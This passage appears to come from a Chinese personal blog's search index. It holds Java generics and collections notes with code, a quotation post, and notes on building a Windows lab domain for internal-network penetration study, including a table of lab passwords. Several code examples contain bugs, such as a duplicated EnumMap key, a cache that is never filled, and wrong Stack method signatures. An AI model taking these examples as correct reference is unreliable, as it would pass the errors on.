n);\nsuper通配符表示只能写不能读。\n无限定通配符&lt;?&gt;很少使用，可以用&lt;T&gt;替换，同时它是所有&lt;T&gt;类型的超类。\n\npackage com.pan3a.generics.supers;public class GenericsSuper &#123;    public static void main(String[] args) &#123;        Pair&lt;Number&gt; pairOne = new Pair&lt;&gt;(12.3, 45.6);        Pair&lt;Integer&gt; pairTwo = new Pair&lt;&gt;(123, 456);        setSame(pairOne,100);        setSame(pairTwo,200);        System.out.println(pairOne.getFirst() + &quot; &quot; + pairOne.getLast());        System.out.println(pairTwo.getFirst() + &quot; &quot; + pairOne.getLast());    &#125;    static void setSame(Pair&lt;? super Integer&gt; pair,Integer integer)&#123;        pair.setFirst(integer);        pair.setLast(integer);    &#125;&#125;class Pair&lt;T&gt;&#123;    private T first;    private T last;    public Pair(T first, T last)&#123;        this.first = first;        this.last = last;    &#125;    public T getFirst()&#123;        return first;    &#125;    public T getLast()&#123;        return last;    &#125;    public void setFirst(T first)&#123;        this.first = first;    &#125;    public void setLast(T last)&#123;        this.last = last;    &#125;&#125;\n\n\n无限定通配符\n&lt;?&gt;既不能读也不能写。\nPair&lt;?&gt;是Pair&lt;T&gt;的超类，因此可以向上转型。\n\npublic class main&#123;      public static void main(String[] args) &#123;        Pair&lt;Integer&gt; p = new Pair&lt;&gt;(123, 456);        Pair&lt;?&gt; p2 = p; // 安全地向上转型        System.out.println(p2.getFirst() + &quot;, &quot; + p2.getLast());    &#125;&#125;class Pair&lt;T&gt; &#123;    private T first;    private T last;    public Pair(T first, T last) &#123;        this.first = first;        this.last = last;    &#125;    public T getFirst() &#123;        return first;    &#125;    public T getLast() &#123;        return last;    &#125;    public void setFirst(T first) &#123;        this.first = first;    &#125;    public void setLast(T last) &#123;        this.last = last;    &#125;&#125;\n\n\n泛型与反射- \n集合List\nList可添加重复元素和null，有ArrayList和LinkedList优先使用前者。\n遍历时使用for each或者Iterator，推荐使用前者，操作简单。\n\nimport java.util.ArrayList;import java.util.Arrays;import java.util.Iterator;import java.util.List;public class collectionList &#123;    public static void main(String[] args) &#123;        List&lt;String&gt; list = addList();        forList(list);        iterationList(list);        forEachList(list);        String[] array = listToArray(list);        arrayToList(array);    &#125;    static void createList()&#123;//        JDK9  这里不接受null//        List&lt;Integer&gt; list = List.of(1,2,3);    &#125;    static List&lt;String&gt; addList()&#123;        List&lt;String&gt; list = new ArrayList&lt;&gt;();        list.add(&quot;apple&quot;);        list.add(&quot;pear&quot;);        list.add(&quot;apple&quot;);        list.add(null);        System.out.println(list.size());        String second = list.get(3);        System.out.println(second);        return list;    &#125;    static void forList(List&lt;String&gt; list)&#123;        System.out.println(&quot;For循环遍历&quot;);        for(int count=0; count&lt;list.size(); count++)&#123;            String string = list.get(count);            System.out.println(string);        &#125;    &#125;    static void iterationList(List&lt;String&gt; list)&#123;        System.out.println(&quot;Iteration迭代遍历&quot;);        for(Iterator&lt;String&gt; iterator = list.iterator(); iterator.hasNext();)&#123;            String string = iterator.next();            System.out.println(string);        &#125;    &#125;    static void forEachList(List&lt;String&gt; list)&#123;        System.out.println(&quot;for each 遍历&quot;);        for(String string:list)&#123;            System.out.println(string);        &#125;    &#125;    static String[] listToArray(List&lt;String&gt; list)&#123;        System.out.println(&quot;List转换成Array&quot;);        String[] array = list.toArray(new String[list.size()]);//      数字的话等价 Number可兼容其他类型   Number[] array = list.toArray(Number[]::new);        for (String string:array)&#123;            System.out.println(string);        &#125;        return array;    &#125;    static void arrayToList(String[] array)&#123;        System.out.println(&quot;Array转换成List&quot;);//        这里返回的是个只读List 无法add remove        List&lt;String&gt; list = Arrays.asList(array);        System.out.println(list);    &#125;&#125;\n\n\n编写equals\nList的contains()判断是否包含某个变量、indexOf()获取变量所处序号位置。 \n在List中查找元素时，List的实现类通过元素的equals()方法比较两个元素是否相等，因此，放入的元素必须正确覆写equals()方法，Java标准库提供的String、Integer等已经覆写了equals()方法，如果不在List中查找元素，就不必覆写equals()方法。 \n确定两个实例是否相等首先用instanceof判断是否是Object类型，对引用类型用Objects.equals()比较，对基本类型直接用==比较。 \n如果不调用List的contains()、indexOf()这些方法，那么放入的元素就不需要实现equals()方法。\n\npackage com.pan3a.collection.equals;import java.util.ArrayList;import java.util.List;import java.util.Objects;public class collectionEquals &#123;    public static void main(String[] args) &#123;        List&lt;String&gt; stringList = new ArrayList&lt;&gt;();        stringList.add(&quot;A&quot;);        stringList.add(&quot;B&quot;);        System.out.println(stringList.contains(&quot;A&quot;));        System.out.println(stringList.contains(&quot;C&quot;));//        因为Java内部String类实现类equals方法不是===对比，因此为true        System.out.println(stringList.contains(new String(&quot;A&quot;)));        System.out.println(&quot;---------------------&quot;);        System.out.println(stringList.indexOf(&quot;A&quot;));        System.out.println(stringList.indexOf(&quot;C&quot;));        System.out.println(stringList.indexOf(new String(&quot;A&quot;)));        System.out.println(&quot;----------------------&quot;);        List&lt;Person&gt; list = new ArrayList&lt;&gt;();        list.add(new Person(&quot;Pan3a&quot;,&quot;Pan3a&quot;,18));        list.add(new Person(&quot;Forever404&quot;,&quot;Forever404&quot;,20));        System.out.println(list.contains(new Person(&quot;Pan3a&quot;,&quot;Pan3a&quot;,18)));        System.out.println(list.indexOf(new Person(&quot;Forever404&quot;,&quot;Forever404&quot;,20)));    &#125;&#125;class Person&#123;    String firstName;    String lastName;    int age;    public Person(String firstName, String lastName, int age)&#123;        this.firstName = firstName;        this.lastName = lastName;        this.age = age;    &#125;//    因为Person类没有系统自带的equals方法因此需要自己写  而String Integer这些Java标准库已经实现类equals方法    public boolean equals(Object object)&#123;        if(object instanceof Person)&#123;            Person person = (Person) object;            return Objects.equals(this.firstName,person.firstName) &amp;&amp; this.age == person.age &amp;&amp; Objects.equals(this.lastName,person.lastName);        &#125;        return false;    &#125;&#125;\n\n\n编写Map\n类似于字典的key，value对应。\n\npackage com.pan3a.collection.map;import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map;public class collectionMap &#123;    public static void main(String[] args) &#123;        Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();        map.put(&quot;apple&quot;,123);        map.put(&quot;pear&quot;,456);        forEachKey(map);        forEachEntrySet(map);        testMap();    &#125;    static void forEachKey(Map&lt;String, Integer&gt; map)&#123;        for (String key : map.keySet())&#123;            Integer value = map.get(key);            System.out.println(key + &quot; = &quot; + value);        &#125;    &#125;    static void forEachEntrySet(Map&lt;String, Integer&gt; map)&#123;        System.out.println(&quot;--------EntrySet--------&quot;);        for (Map.Entry&lt;String, Integer&gt; entry : map.entrySet())&#123;            String key = entry.getKey();            Integer value = entry.getValue();            System.out.println(key + &quot; = &quot; + value);        &#125;    &#125;    static void testMap()&#123;        List&lt;Student&gt; list = new ArrayList&lt;&gt;();        list.add(new Student(&quot;Bob&quot;,77));        list.add(new Student(&quot;Pan3a&quot;,89));        list.add(new Student(&quot;Forever404&quot;,79));        Students students = new Students(list);        System.out.println(students.getScore(&quot;Bob&quot;) == 77 ? &quot;测试成功&quot; : &quot;测试失败&quot;);        System.out.println(students.getScore(&quot;Tom&quot;) == -1 ? &quot;测试成功&quot; : &quot;测试失败&quot;);        System.out.println(students.findInList(&quot;Bob&quot;));    &#125;&#125;class Student&#123;    String name;    int score;    Student(String name, int score)&#123;        this.name = name;        this.score = score;    &#125;&#125;class Students&#123;    List&lt;Student&gt; list;    Map&lt;String, Integer&gt; cache;    Students(List&lt;Student&gt; list)&#123;        this.list = list;        cache = new HashMap&lt;&gt;();    &#125;    /*    * 根据name查找score，找到返回score，未找到返回-1     */    int getScore(String name)&#123;        Integer score = this.cache.get(name);        if(score == null)&#123;            //        &#125;        return score == null ? -1 : score.intValue();    &#125;    Integer findInList(String name)&#123;        for(Student student : this.list)&#123;            if (student.name.equals(name))&#123;                return student.score;            &#125;        &#125;        return null;    &#125;&#125;\n\n\n编写equals和hashCode\nHashMap，作为key的类必须正确覆写equals()和hashCode()方法；一个类如果覆写了equals()，就必须覆写hashCode()，并且覆写规则是： \n如果equals()返回true，则hashCode()返回值必须相等；\n如果equals()返回false，则hashCode()返回值尽量不要相等。\n\n\n\n实现hashCode()方法可以通过Objects.hashCode()辅助方法实现。 \npackage com.pan3a.collection.hashcode;import java.util.HashMap;import java.util.Map;import java.util.Objects;public class collectionHashCode &#123;    public static void main(String[] args) &#123;        String string = new String(&quot;Hello&quot;);        String test = new String(&quot;Hello&quot;);        System.out.println(string.hashCode());        System.out.println(test.hashCode());        System.out.println(string.equals(test));        System.out.println(string == test);        System.out.println(&quot;-------hashcode &amp;&amp; equals------&quot;);        Person personOne = new Person(&quot;Pan3a&quot;,18);        Map&lt;Person,Integer&gt; map = new HashMap&lt;&gt;();        map.put(personOne,123);        Person personTwo = new Person(&quot;Pan3a&quot;,18);        System.out.println(personOne == personTwo);        System.out.println(personOne.equals(personTwo));        System.out.println(map.get(personOne));        System.out.println(map.get(personTwo));    &#125;&#125;class Person&#123;    public String name;    public int age;    Person(String name, int age)&#123;        this.name = name;        this.age = age;    &#125;    @Override    public int hashCode()&#123;        return Objects.hashCode(age) + Objects.hashCode(name);    &#125;    @Override    public boolean equals(Object object)&#123;        if(object instanceof Person)&#123;            Person person = (Person) object;            return Objects.equals(this.name,person.name) &amp;&amp; this.age == person.age;        &#125;        return false;    &#125;&#125;\n\n\n编写EnumMap\n如果Map的key是enum类型，推荐使用EnumMap，既保证速度，也不浪费空间。使用EnumMap的时候，根据面向抽象编程的原则，应持有Map接口。\n\nimport java.time.DayOfWeek;import java.util.EnumMap;import java.util.Map;public class collectionEnumMap &#123;    public static void main(String[] args) &#123;        Map&lt;DayOfWeek,String&gt; map = new EnumMap&lt;&gt;(DayOfWeek.class);        map.put(DayOfWeek.MONDAY,&quot;星期一&quot;);        map.put(DayOfWeek.TUESDAY,&quot;星期二&quot;);        map.put(DayOfWeek.WEDNESDAY,&quot;星期三&quot;);        map.put(DayOfWeek.TUESDAY,&quot;星期四&quot;);        map.put(DayOfWeek.FRIDAY,&quot;星期五&quot;);        map.put(DayOfWeek.SATURDAY,&quot;星期六&quot;);        map.put(DayOfWeek.SUNDAY,&quot;星期日&quot;);        System.out.println(map);        System.out.println(map.get(DayOfWeek.MONDAY));    &#125;&#125;\n\n\n使用TreeMap\nSortedMap在遍历时严格按照Key的顺序遍历，最常用的实现类是TreeMap；作为SortedMap的Key必须实现Comparable接口，或者传入Comparator；要严格按照compare()规范实现比较逻辑，否则，TreeMap将不能正常工作。\n\npackage com.pan3a.coolestions.treemap;import java.util.Comparator;import java.util.Map;import java.util.TreeMap;public class collectionTreeMap &#123;    public static void main(String[] args) &#123;        sortingMap();    &#125;    public static void test()&#123;        Map&lt;String,Integer&gt; map = new TreeMap&lt;&gt;();        map.put(&quot;orange&quot;,1);        map.put(&quot;apple&quot;,2);        map.put(&quot;pear&quot;,3);        for(String key: map.keySet())&#123;            System.out.println(key);        &#125;    &#125;    public static void sortingMap()&#123;        Map&lt;Person,Integer&gt; map = new TreeMap&lt;&gt;(new Comparator&lt;Person&gt;() &#123;            @Override            public int compare(Person personOne, Person personTwo) &#123;                if(personOne.score == personTwo.score)&#123;                    return 0;                &#125;                return personOne.score &gt; personTwo.score ? -1 : 1;            &#125;        &#125;);        map.put(new Person(&quot;Pan3a&quot;,78),1);        map.put(new Person(&quot;Forever404&quot;,89),2);        map.put(new Person(&quot;Bob&quot;,62),3);        for (Person key : map.keySet())&#123;            System.out.println(key);        &#125;        System.out.println(map.get(new Person(&quot;Bob&quot;,62)));    &#125;&#125;class Person&#123;    public String name;    public int score;    Person(String name, int score)&#123;        this.name = name;        this.score = score;    &#125;    @Override    public String toString()&#123;        return String.format(&quot;&#123;%s: score=%d&#125;&quot;,name,score);    &#125;&#125;\n\n\n使用Properties\nJava集合库提供的Properties用于读写配置文件.properties。.properties文件可以使用UTF-8编码。可以从文件系统、classpath或其他任何地方读取.properties文件。读写Properties时，注意仅使用getProperty()和setProperty()方法，不要调用继承而来的get()和put()等方法。\n\nimport java.io.*;import java.util.Properties;public class collectionProperties &#123;    public static void main(String[] args)&#123;        testRead();        bytesCodeRead();        testWrite();    &#125;    public static void testRead()&#123;//        为啥相对路径不行        String filePath = &quot;/Users/pan3a/CodeProject/JavaProject/src/setting.properties&quot;;        Properties properties = new Properties();        try &#123;            properties.load(new FileInputStream(filePath));        &#125; catch (IOException exception) &#123;            exception.printStackTrace();            System.out.println(exception);        &#125;        String getFilePath = properties.getProperty(&quot;last_open_file&quot;);//        设置默认值120 当不存在该配置时        String getInterval = properties.getProperty(&quot;auto_sava_interval&quot;,&quot;120&quot;);        System.out.println(getFilePath);        System.out.println(getInterval);    &#125;    public static void bytesCodeRead() &#123;        String settings = &quot;# test&quot; + &quot;\\n&quot; + &quot;course=Java&quot; + &quot;\\n&quot; + &quot;last_open_date=2019-08-07T12:35:01&quot;;        ByteArrayInputStream input = null;        try &#123;            input = new ByteArrayInputStream(settings.getBytes(&quot;UTF-8&quot;));        &#125; catch (UnsupportedEncodingException e) &#123;            e.printStackTrace();        &#125;        Properties props = new Properties();        try &#123;            props.load(input);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;        System.out.println(&quot;course: &quot; + props.getProperty(&quot;course&quot;));        System.out.println(&quot;last_open_date: &quot; + props.getProperty(&quot;last_open_date&quot;));        System.out.println(&quot;last_open_file: &quot; + props.getProperty(&quot;last_open_file&quot;));        System.out.println(&quot;auto_save: &quot; + props.getProperty(&quot;auto_save&quot;, &quot;60&quot;));    &#125;    public static void testWrite() &#123;        Properties properties = new Properties();        properties.setProperty(&quot;url&quot;,&quot;https://www.baidu.com&quot;);        properties.setProperty(&quot;language&quot;,&quot;Java&quot;);        try &#123;            properties.store(new FileOutputStream(&quot;/Users/pan3a/CodeProject/JavaProject/src/setting.properties&quot;),&quot;这是写入的注释&quot;);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n\n使用Set\nSet用于存储不重复的元素集合：放入HashSet的元素与作为HashMap的key要求相同；放入TreeSet的元素与作为TreeMap的Key要求相同；利用Set可以去除重复元素；遍历SortedSet按照元素的排序顺序遍历，也可以自定义排序算法。\n\nimport java.util.*;public class collectionSet &#123;    public static void main(String[] args) &#123;        testSet();        treeSet();    &#125;    static void testSet()&#123;        Set&lt;String&gt; set = new HashSet&lt;&gt;();        System.out.println(set.add(&quot;Pan3a&quot;));        System.out.println(set.add(&quot;Forever404&quot;));        System.out.println(set.add(&quot;Pan3a&quot;));        System.out.println(set.contains(&quot;Pan3a&quot;));        System.out.println(set.remove(&quot;Panda&quot;));        System.out.println(set.size());    &#125;    static void treeSet()&#123;        System.out.println(&quot;--------------------------&quot;);        List&lt;Message&gt; messageList =  new ArrayList&lt;&gt;();        messageList.add(new Message(1,&quot;Hello!&quot;));        messageList.add(new Message(2,&quot;发工资了吗&quot;));        messageList.add(new Message(2,&quot;发工资了吗&quot;));        messageList.add(new Message(3,&quot;中午吃啥子&quot;));        messageList.add(new Message(3,&quot;中午吃啥子&quot;));        List&lt;Message&gt; displayMessages = process(messageList);//        避免重复展示数据        for (Message message : displayMessages)&#123;            System.out.println(message.text);        &#125;    &#125;    static List&lt;Message&gt; process(List&lt;Message&gt; received)&#123;        Set&lt;Message&gt; messageSet = new TreeSet&lt;&gt;();        List&lt;Message&gt; messageListTwo = new ArrayList&lt;&gt;();        for(Message message : received)&#123;            messageSet.add(message);        &#125;        for (Message message : messageSet)&#123;            messageListTwo.add(message);        &#125;        return messageListTwo;//        return received;    &#125;&#125;class Message implements Comparable&lt;Message&gt;&#123;    public final int sequence;    public final String text;    Message(int sequence, String text) &#123;        this.sequence = sequence;        this.text = text;    &#125;    @Override    public int compareTo(Message message) &#123;        if (this.sequence == message.sequence)&#123;            return 0;        &#125;        return this.sequence &gt; message.sequence ? 1 : -1;    &#125;&#125;\n\n\n使用Queue\n队列Queue实现了一个先进先出（FIFO）的数据结构：通过add()&#x2F;offer()方法将元素添加到队尾；通过remove()&#x2F;poll()从队首获取元素并删除；通过element()&#x2F;peek()从队首获取元素但不删除。要避免把null添加到队列。\n\nimport java.util.LinkedList;import java.util.Queue;public class collectionQueue &#123;    public static void main(String[] args) &#123;        Queue&lt;String&gt; queue = new LinkedList&lt;&gt;();        queue.offer(&quot;apple&quot;);        queue.offer(&quot;pear&quot;);        queue.offer(&quot;banana&quot;);        System.out.println(queue.poll());        System.out.println(queue.element());        System.out.println(queue.element());        System.out.println(queue.poll());        System.out.println(queue.poll());        System.out.println(queue.poll());    &#125;&#125;\n\n\n使用PriorityQueue\nPriorityQueue实现了一个优先队列：从队首获取元素时，总是获取优先级最高的元素。PriorityQueue默认按元素比较的顺序排序（必须实现Comparable接口），也可以通过Comparator自定义排序算法（元素就不必实现Comparable接口）。\n\nimport java.util.Comparator;import java.util.PriorityQueue;import java.util.Queue;public class collectionPriorityQueue &#123;    public static void main(String[] args) &#123;        testPriorityQueue();        testUserPriorityQueue();    &#125;    public static void testPriorityQueue()&#123;        Queue&lt;String&gt; queue = new PriorityQueue&lt;&gt;();        queue.offer(&quot;apple&quot;);        queue.offer(&quot;pear&quot;);        queue.offer(&quot;banana&quot;);        System.out.println(queue.poll());        System.out.println(queue.poll());        System.out.println(queue.poll());        System.out.println(queue.poll());    &#125;    public static void testUserPriorityQueue()&#123;        System.out.println(&quot;--------------------&quot;);        Queue&lt;User&gt; queue = new PriorityQueue&lt;&gt;(new UserComparator());        queue.offer(new User(&quot;Bob&quot;,&quot;A7&quot;));        queue.offer(new User(&quot;Alice&quot;,&quot;A2&quot;));        queue.offer(new User(&quot;Pan3a&quot;,&quot;V10&quot;));        queue.offer(new User(&quot;Jack&quot;,&quot;A3&quot;));        queue.offer(new User(&quot;Hack&quot;,&quot;V2&quot;));        int counts = queue.size();        for(int count = 0; count &lt; counts; count++) &#123;            System.out.println(queue.poll());        &#125;    &#125;&#125;class User&#123;    public final String name;    public final String number;    public User(String name, String number)&#123;        this.name = name;        this.number = number;    &#125;    @Override    public String toString()&#123;        return name + &quot;/&quot; + number;    &#125;&#125;class UserComparator implements Comparator&lt;User&gt; &#123;    @Override    public int compare(User userOne, User userTwo) &#123;        if(userOne.number.charAt(0) == userTwo.number.charAt(0))&#123;            return userOne.number.compareTo(userTwo.number);        &#125;        if (userOne.number.startsWith(&quot;V&quot;))&#123;            return -1;        &#125;else &#123;            return 1;        &#125;    &#125;&#125;\n\n\n使用Deque\nDeque实现了一个双端队列（Double Ended Queue），它可以： \n将元素添加到队尾或队首：addLast()&#x2F;offerLast()&#x2F;addFirst()&#x2F;offerFirst()；\n从队首／队尾获取元素并删除：removeFirst()&#x2F;pollFirst()&#x2F;removeLast()&#x2F;pollLast()；\n从队首／队尾获取元素但不删除：getFirst()&#x2F;peekFirst()&#x2F;getLast()&#x2F;peekLast()；\n总是调用xxxFirst()&#x2F;xxxLast()以便与Queue的方法区分开；\n避免把null添加到队列。import java.util.Deque;import java.util.LinkedList;public class collectionDeque &#123;    public static void main(String[] args) &#123;        Deque&lt;String&gt; deque = new LinkedList&lt;&gt;();        deque.offerLast(&quot;A&quot;);        deque.offerLast(&quot;B&quot;);        deque.offerFirst(&quot;C&quot;);                  // C &lt;= A &lt;= B        System.out.println(deque.pollFirst());        System.out.println(deque.pollLast());        System.out.println(deque.pollFirst());    &#125;&#125;\n\n\n\n使用Stack\n栈（Stack）是一种后进先出（LIFO）的数据结构，操作栈的元素的方法有： \n把元素压栈：push(E)；\n把栈顶的元素“弹出”：pop(E)；\n取栈顶元素但不弹出：peek(E)。\n\n\n\n在Java中，我们用Deque可以实现Stack的功能，注意只调用push()&#x2F;pop()&#x2F;peek()方法，避免调用Deque的其他方法。最后，不要使用遗留类Stack。 \n使用Iterator\nIterator是一种抽象的数据访问模型。使用Iterator模式进行迭代的好处有： \n对任何集合都采用同一种访问模型；\n调用者对集合内部结构一无所知；\n集合类返回的Iterator对象知道如何迭代。\n\n\n\nJava提供了标准的迭代器模型，即集合类实现java.util.Iterable接口，返回java.util.Iterator实例 \nimport java.util.ArrayList;import java.util.Iterator;import java.util.List;public class collectionIterator &#123;    public static void main(String[] args) &#123;        ReverseList&lt;String&gt; reverseList = new ReverseList&lt;&gt;();        reverseList.add(&quot;Apple&quot;);        reverseList.add(&quot;Orange&quot;);        reverseList.add(&quot;Pear&quot;);        for (String string : reverseList)&#123;            System.out.println(string);        &#125;    &#125;&#125;class ReverseList&lt;T&gt; implements Iterable&lt;T&gt;&#123;    private List&lt;T&gt; list = new ArrayList&lt;&gt;();    public void add(T t)&#123;        list.add(t);    &#125;    public Iterator&lt;T&gt; iterator()&#123;        return new ReverseIterator(list.size());    &#125;    class ReverseIterator implements Iterator&lt;T&gt;&#123;        int index;        ReverseIterator(int index)&#123;            this.index = index;        &#125;        @Override        public boolean hasNext() &#123;            return index &gt; 0;        &#125;        @Override        public T next() &#123;            index--;            return ReverseList.this.list.get(index);        &#125;    &#125;&#125;\n\n\n使用Collections\nCollections类提供了一组工具方法来方便使用集合类： \n创建空集合；\n创建单元素集合；\n创建不可变集合；\n排序／洗牌等操作。\n\n\n\nimport java.util.ArrayList;import java.util.Collections;import java.util.List;public class collectionCollections &#123;    public static void main(String[] args) &#123;        testCollections();        mutableCollections();    &#125;    public static void testCollections()&#123;        List&lt;String&gt; list = new ArrayList&lt;&gt;();        list.add(&quot;apple&quot;);        list.add(&quot;pear&quot;);        list.add(&quot;orange&quot;);        System.out.println(list);//        排序        Collections.sort(list);        System.out.println(list);//        随机顺序        Collections.shuffle(list);        System.out.println(list);    &#125;    public static void mutableCollections()&#123;        System.out.println(&quot;---------------------&quot;);        List&lt;String&gt; mutable = new ArrayList&lt;&gt;();        mutable.add(&quot;apple&quot;);        mutable.add(&quot;pear&quot;);        List&lt;String&gt; immutable = Collections.unmodifiableList(mutable);        mutable.add(&quot;orange&quot;);        System.out.println(immutable);    &#125;&#125;\n","categories":["JavaSecurity"]},{"title":"语录","url":"/4/","content":"\n本文主要记录了自己摘抄的一些自认为写得很好的句子。\n\n\n\n\n我告诉你我喜欢你，并不是一定要和你在一起，只是希望今后的你，在遭遇人生低谷的时候，不要灰心，至少曾经有人被你的魅力所吸引，曾经是，以后也会是。—-村上村树\n\n","categories":["essay"]},{"title":"内网渗透之域环境搭建（一）","url":"/5/","content":"\n本文主要记录了自己学习《内网安全攻防-渗透测试指南》第一章，主要介绍了内网渗透的会遇到的一些事物的概念和作用。\n\n\n\n\n内网渗透测试，顾名思义就是对内网进行渗透测试，然后这里的渗透测试和平常的Web渗透不太一样，但是大体的思路都是一致的，都是先针对目标进行信息搜集，因为渗透的本质就是信息搜集的嘛。\n\n内网安全攻防，那肯定要先明白啥子是内网的嘛。我觉得内网的话应该相对而言吧，比如一所学校，学校有自己的官网，然后大家都可以在互联网上直接访问到，有些资产架设在内网中，需要特定的VPN或者在学校里面才能访问，这些需要VPN访问的资产我就称它为内网。互联网上有的资产只占小部分，重要的内容大部分都设置在内网当中的，然后渗透的时候Web渗透只是开始，内网渗透合起来才是完整的渗透测试。\n\n\n工作组\n工作组就像一个类似于学校的社团，学校可能有街舞社、篮球社、吉他社等等。然后你是这个学校的一名学生，你可以参加这些社团，也可以从某个社团中退出来、当然还可以创建自己的社团。工作组也是一样的，一台电脑就是一个学生，一个内网就是一个学校。你可以加入某个工作组、退出某个工作组、创建某个工作组。这样如果找街舞社的张三同学，那么去街舞社就可以了，更方便管理。\n\n加入工作组—更改工作组组名为想加入的工作组组名即可，创建工作组—更改的工作组组名如果不存在该工作组则会重新创建一个工作组，退出工作组—更改工作组组名即可。\n\nWindows10更改工作组组名：查看高级系统设置-&gt;计算机名-&gt;更改，更改完重启电脑就可以了\n\n\n\n域\n域的话当然要有一个域环境了，虽然网上有域环境，但是我觉得纸上得来终觉浅，绝知此事要躬行。因此我们还是自己手动搭建一个域环境吧。\n\nhttps://xyzsec.cn/2021/09/21/nei-wang-shen-tou-ji-chu-ji-huan-jing-da-jian/\n\nhttps://www.freebuf.com/articles/network/284730.html\n\nhttps://www.f12bug.com/archives/%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA    域环境搭建\n\n加入域的时候可能会存在于域无法建立连接     因此更改C:\\Windows\\System32\\drivers\\etc\\hosts文件\n\n不知道为啥突然换了个网络，就能加入域了。\n\n放弃了，自己搭建环境有超级多的问题\n\n为什么有域这个东西呢？比如说一个网络中有中有200台主机，有个人Alan可以登录其中任何一台计算机，那么我们就要在这200台计算机中存储Alan的用户名和密码。一旦这个人想更改密码，那么我们就得更在这200台计算机上更改。这样是不是太麻烦了，于是乎就有了域这个环境。\n\n域是一个有安全边界的计算机集合（一个域内的用户无法访问另一个域内的数据），用户想要访问域内资源，需要用合法的身份登录，并判断其权限可以访问哪些资源。\n域环境搭建\n虽然搭建过程可能会出现莫名其妙的错误，但是我还是一步一步来嘛。\n\n解决win2012安装VM Tools为灰色，将/Applications/VMware Fusion.app/Contents/Library/isoimages中的windows.iso镜像复制到虚拟机路径，设置CD&#x2F;DVD镜像选择所复制到I2SO文件。\n\n\n\n服务器\nIP\n用户名\n密码\nDSRM\n\n\n\nwindows 2012\n192.168.1.10\nwin12\n\n\n\n\nadministrator\nwin2012@2022\n\n\n\n\n\nwin2012@admin\nwin2012@dsrm\n\n\n\n\n\nwindows 2008\n192.168.1.20\nwin8\n\n\n\n\nadministartor\n\n\n\n\n\n\nhack.com\\win2008\nwin2008@2022\n\n\n\n\n\nwin2008@admin\n\n\n\n\n\n\nwin8@2022..\n\n\n\n\n\n\nwindows 2007\n192.168.1.30\nwin7\n\n\n\n\nadministrator\nwin2007@2022..\n\n\n\n\n\n\n\n域控制器安装\n这里我将域控制器安装在Windows 2012，首先设置IP，设置administrator用户密码。\n\n\n\n这里更改完计算机名字后，需要重启计算机。\n\n\n\n安装DNS服务器和Active Directory(AD）。\n\n\n\n安装成功。\n\n\n\n将其升级为域控制器\n\n\n\n设置根域名\n\n\n\n设置目录还原模式密码\n\n\n\n这里虽然会提示DNS服务警告，但是不用管，然后一直下一步下一步。\n一直到先决条件检查。\n\n\n\n然后点击安装，最后安装完成，然后会重启服务器。\n\n\n\n创建Active Directory用户\n\n\n\n然后输入密码win2008、 win8@2022..\n\n\nwindows2008 R2\n这里无法安装VM Tools，安装显示不信任此安装  驱动无法安装  百度了哈需要补丁    安装软件时需要验证域管理员用户\nhttps://catalog.s.download.windowsupdate.com/c/msdownload/update/software/secu/2019/09/windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu\n更改IP和隶属于域和计算机名\n\n\nwindows2007\n和上面一样的操作，配置IP，更改计算机名。\n域控制器\nDomain Controller简称DC，域中一台管理域环境的计算机，类似于小区的保安门禁系统。进入小区需要进行身份认证，来判断你是否属于这个小区，可以访问小区内的那些资源。\n\n域控制器保存着用户的用户名、密码、个人信息等都保存在一个活动目录（AD）中，类似于数据库。\n单域\n一般来说一个域中至少存在两台域服务器，一个作为域控制器，另一台作为备份DC。一台瘫痪了，另一台可以工作，这样域环境就还可以使用。\n父域&amp;子域\n一个公司有很多下属，在不同的位置。这样就出现了父域子域，每个分公司可以自己定义规则来管理自己所处的子域。而总部只需要管理下属的子域即可。这样信息就不会交叉，网络请求也会很快。\n\n如中国通信服务，下级包含重庆通信服务、浙江通信服务、四川通信服务等。\n域树\n前面说了，一个域的域管理员只能管理当前自己所处的域，那么要访问其他域中的资源应该怎么办呢，则需要简历信任关系（Trust Relation）。域树内的父域与子域可以跨网络分配文件和打印机等物理设备。\n\n域树中的父域与子域采用类似子域名的形式。\n\n\n\n域森林\n公司被吞并了，需要加入其他公司的网络中。因此需要多个域树建立信任关系成域森林。\n\n\n域名服务器\n域名服务器（Domain Name Server）实现域名与IP互相转换的服务器。一般来说DNS服务器就是域控制器，DNS服务器通常和域控制器在同一台计算机上。\n活动目录\nActive Directory(AD）活动目录，指域环境中提供目录服务的组件。\n\n我认为活动目录就是将内网的资源形成一个索引的字典吧，可以将我们需要访问的数据快速定位。\n\n包含以下功能\n\n账号集中管理：所有账号存储在服务器中，以便执行命令和重置密码；\n\n软件集中管理：统一推送软件(软件安装)，安装网络打印机(硬件设备)；\n\n环境集中管理：统一客户端界面(统一桌面不知)&#x2F;IE(安全性策略)&#x2F;…等设置；\n\n增强安全性：统一部署杀毒软件和病毒扫描任务&#x2F;集中管理用户的计算机权限&#x2F;统一制定用户密码策略等；\n\n更可靠，更短的宕机时间：利用活动目录控制用户方位权限\n\n活动目录是微软提供的统一管理平台，ISA&#x2F;Exchange&#x2F;SMS等都依赖这个平台\n域控制器与活动目录\n活动目录就类似于一个数据库，而数据库则是要安装在计算机上的，那个计算机安装了活动目录，那么这个计算机就是域控制器。\n安全域\n划分安全域则是将一组安全等级相同的计算机划入同一个网段。\n\n\n\n\n安全级别最高的内网\n\n安全级别中等的DMZ区域\n\n安全级别最低的外网\n\n内网的一般策略如下\n\n内网可以访问外网：满足内网用户上网查阅资料办公的需求；\n\n内网可以访问DMZ：是管理者可以管理DMZ区域当中的服务器设备；\n\n外网不能访问内网：内网存储公司重要资料，可以使用VPN来访问；\n\n外网可以访问DMZ：DMZ区域中的服务器对外界提供服务，需要由防火墙来完成对外地址到服务器实际地址的转换；\n\nDMZ不能访问内网：当服务器沦陷保护内网主机不受入侵；\n\nDMZ不能访问外网：限制入侵黑客的通信隧道，邮件服务器除外；\n域计算分类\n域控制器：用于管理所有的网络访问，包括登录服务器，访问共享目录及资源\n\n成员服务器：安全了服务器系统并加入了域，主要任务是提供服务\n\n客户机：安装了个人系统的计算机并加入了域\n\n独立服务器：能够对外提供服务但是没有加入域\n域内权限\n有点模糊不清，需要再仔细学习一下。\n\n组是用户账号的集合，通过组可以更好的管理用的权限；域环境有：本地组、全局